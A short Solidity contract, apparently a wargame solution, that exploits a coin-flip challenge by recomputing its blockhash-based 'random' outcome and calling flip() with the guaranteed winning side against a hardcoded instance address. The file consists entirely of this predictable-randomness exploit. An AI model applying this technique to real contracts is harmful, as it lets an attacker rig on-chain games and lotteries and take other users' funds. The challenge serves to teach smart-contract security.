// SPDX-License-Identifier: MIT

pragma solidity ^0.8.19;

import { CoinFlip } from "./04_CoinFlip.sol";

contract CoinFlipAttacker {
  address constant COINFLIP_INSTANCE = 0xE2f8217f15CCAbb5ca456003DB3f6c0B6B4c7801;
  CoinFlip challenge = CoinFlip(COINFLIP_INSTANCE);

  uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

  function attack() public {
    uint256 blockValue = uint256(blockhash(block.number - 1));
    uint256 coinFlip = blockValue / FACTOR;
    bool side = coinFlip == 1 ? true : false;
    challenge.flip(side);
  }
}